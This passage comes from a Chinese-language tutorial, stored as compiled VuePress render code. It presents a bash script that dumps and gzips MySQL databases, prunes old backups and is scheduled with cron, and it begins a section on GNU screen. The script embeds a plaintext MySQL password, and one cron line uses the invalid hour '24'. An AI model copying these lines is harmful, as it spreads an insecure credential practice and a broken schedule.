[dbname]")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#==============================================================================")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# CUSTOM SETTINGS")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#==============================================================================")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# directory to put the backup files")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("BACKUP_DIR")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/opt/backup\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# MYSQL Parameters")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("MYSQL_UNAME")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"syscorer"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("MYSQL_PWORD")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"s6stest2n3gz"')]),s._v("\n\n\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("credentialsFile")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"mysql-credentials.cnf"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"[client]"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$credentialsFile")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"user='),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$MYSQL_UNAME")]),s._v('"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$credentialsFile")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"password='),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$MYSQL_PWORD")]),s._v('"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$credentialsFile")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"host=localhost"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$credentialsFile")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Don't backup databases with these names ")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Example: starts with mysql (^mysql) or ends with _schema (_schema$)")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("IGNORE_DB")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"(^mysql|_schema|sys$)"')]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# include mysql and mysqldump binaries for cron bash user")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("PATH")])]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("$PATH")]),s._v(":/usr/local/mysql/bin\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Number of days to keep backups")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("KEEP_BACKUPS_FOR")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#days")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#==============================================================================")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# METHODS")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#==============================================================================")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# YYYY-MM-DD")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("TIMESTAMP")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("date")]),s._v(" +%F"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v(")")])]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function-name function"}},[s._v("delete_old_backups")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Deleting '),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$BACKUP_DIR")]),s._v("/*.sql.gz older than "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$KEEP_BACKUPS_FOR")]),s._v(' days"')]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$BACKUP_DIR")]),s._v(" -type f -name "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"*.sql.gz"')]),s._v(" -mtime +"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$KEEP_BACKUPS_FOR")]),s._v(" -exec "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" -rf "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function-name function"}},[s._v("mysql_login")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('# local mysql_login="-u $MYSQL_UNAME" ')]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('# if [ -n "$MYSQL_PWORD" ]; then')]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('#   local mysql_login+=" -p$MYSQL_PWORD" ')]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# fi")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# echo $mysql_login")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("local")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("mysql_login")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"--defaults-extra-file='),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$credentialsFile")]),s._v('"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function-name function"}},[s._v("database_list")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("local")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("show_databases_sql")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"SHOW DATABASES WHERE \\'),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),s._v("Database"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v(" NOT REGEXP '"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$IGNORE_DB")]),s._v("'\"")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$(")]),s._v("mysql "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("$(")]),s._v("mysql_login"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" -e "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$show_databases_sql")]),s._v('"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("awk")]),s._v(" -F "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('" "')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'{if (NR!=1) print "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$1")]),s._v("}'")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v(")")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function-name function"}},[s._v("echo_status")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("printf")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\r"}},[s._v("\\r")]),s._v("'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" \n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("printf")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("' %0.s'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("100")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v(" \n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("printf")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\r"}},[s._v("\\r")]),s._v("'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" \n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("printf")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$1")]),s._v('"')]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\r"}},[s._v("\\r")]),s._v("'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function-name function"}},[s._v("backup_database")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("backup_file")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$BACKUP_DIR")]),s._v("/"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$TIMESTAMP")]),s._v("."),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$database")]),s._v('.sql.gz"')]),s._v(" \n    "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("output")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$database")]),s._v(" => "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$backup_file")]),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('"')]),s._v("\n    echo_status "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"...backing up '),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$count")]),s._v(" of "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$total")]),s._v(" databases: "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$database")]),s._v('"')]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$(")]),s._v("mysqldump "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("$(")]),s._v("mysql_login"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" $database "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("gzip")]),s._v(" -9 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" $backup_file"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v(")")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function-name function"}},[s._v("backup_databases")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("local")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("databases")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$(")]),s._v("database_list"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v(")")])]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("local")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("total")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$(")]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" $databases "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("wc")]),s._v(" -w "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("xargs")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v(")")])]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("local")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("output")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("local")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("count")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token for-or-select variable"}},[s._v("database")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$databases")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("do")]),s._v("\n    backup_database\n    "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("local")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("count")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$((")]),s._v("count"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("))")])]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("done")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" -ne "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$output")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("column")]),s._v(" -t\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function-name function"}},[s._v("hr")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("printf")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'=%.0s'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("100")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("printf")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#==============================================================================")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# RUN SCRIPT")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#==============================================================================")]),s._v("\ndelete_old_backups\nhr\nbackup_databases\nhr\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("printf")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"All backed up!'),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('"')]),s._v("\n\n")])])]),a("ul",[a("li",[s._v("复制上面的脚本文件到目录: "),a("code",[s._v("/opt/backup/scripts/mysql_backup.sh")]),s._v(",执行如下命令赋予执行权限：")])]),s._v(" "),a("div",{staticClass:"language-shell extra-class"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" +x mysql_backup.sh\n")])])]),a("ul",[a("li",[s._v("执行如下命令，测试脚本是否正常:")])]),s._v(" "),a("div",{staticClass:"language-shell extra-class"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" ./mysql_backup.sh\n")])])]),a("ul",[a("li",[s._v("创建"),a("code",[s._v("Crontab")]),s._v("定时任务\nUsually, you should open your personal crontab file using "),a("code",[s._v("crontab -e")]),s._v(" command, however if you are root user and decide to choose system wide crontab file, you need to edit the crontab file located in "),a("code",[s._v("/etc/crontab")]),s._v(".现在创建一个定时脚本每天夜里执行备份操作：")])]),s._v(" "),a("div",{staticClass:"language-shell extra-class"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 立即生效")]),s._v("\n$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("crontab")]),s._v(" -e\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 需要执行重启服务才能生效: sudo systemctl restart cron.service ,不推荐。语法不一样，可能导致不执行")]),s._v("\n$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nano")]),s._v(" /etc/crontab\n")])])]),a("p",[s._v("我们知道定时任务可以写到/etc/crontab与crontab -e下面，但你知道两者的区别吗?")]),s._v(" "),a("p",[s._v("语法不同")]),s._v(" "),a("p",[s._v("/etc/crontab")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# For details see man 4 crontabs")]),s._v("\n \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Example of job definition:")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# .---------------- minute (0 - 59)")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# |  .------------- hour (0 ar- 23)")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# |  |  .---------- day of month (1 - 31)")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# |  |  |  |  |")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# *  *  *  *  * user-name  command to be executed")]),s._v("\n``"),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),s._v(" \n \n \n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("crontab")]),s._v(" -e\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v("``sh\n*  *  *  *  *  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("command")]),s._v("\n")])])]),a("p",[s._v("使用范围\n修改"),a("code",[s._v("/etc/crontab")]),s._v("这种方法只有root用户能用，这种方法更加方便与直接直接给其他用户设置计划任务，而且还可以指定执行shell等等， "),a("code",[s._v("crontab -e")]),s._v("这种所有用户都可以使用，普通用户也只能为自己设置计划任务。然后自动写入/var/spool/cron/usename")]),s._v(" "),a("p",[s._v("所以推荐使用： "),a("code",[s._v("sudo crontab -e")])]),s._v(" "),a("p",[s._v("按照提示添加最后一行定时脚本：")]),s._v(" "),a("div",{staticClass:"language-shell extra-class"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Running Cron job Daily")]),s._v("\n@daily /opt/backup/scripts/mysql_backup.sh "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" /var/log/mysql/mysql-backup.log "),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("&1")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Running Cron job at 2AM Daily")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" * * * /opt/backup/scripts/mysql_backup.sh "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" /var/log/mysql/mysql-backup.log "),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("&1")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Running Cron job at 12AM & 12PM Daily")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("12,24")]),s._v(" * * * /opt/backup/scripts/mysql_backup.sh "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" /var/log/mysql/mysql-backup.log "),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("&1")]),s._v("\n\n")])])]),a("ul",[a("li",[s._v("查看执行情况（crontab执行 日志）")])]),s._v(" "),a("p",[s._v("执行结果不论是否成功，都会在 "),a("code",[s._v("/var/spool/mail/mail")]),s._v("文件中有"),a("code",[s._v("crontab")]),s._v("执行日志的记录,另外可以自己指定日志目录，参考后面的命令参数。\n"),a("ClientOnly",[a("in-article-adsense",{attrs:{"ins-style":"display:block; text-align:center;","data-ad-slot":"7727965566"}})],1)],1),s._v(" "),a("h2",{attrs:{id:"ssh-或者telent登录linux后screen后台运行脚本"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ssh-或者telent登录linux后screen后台运行脚本"}},[s._v("#")]),s._v(" SSH 或者telent登录linux后screen后台运行脚本")]),s._v(" "),a("p",[s._v("Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。后台运行命令。")]),s._v(" "),a("p",[s._v("在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。")]),s._v(" "),a("ul",[a("li",[s._v("安装")])]),s._v(" "),a("div",{staticClass:"language-shell extra-class"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("apt")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("screen")]),s._v("\n")])])]),a("ul",[a("li",[s._v("命令说明")])]),s._v(" 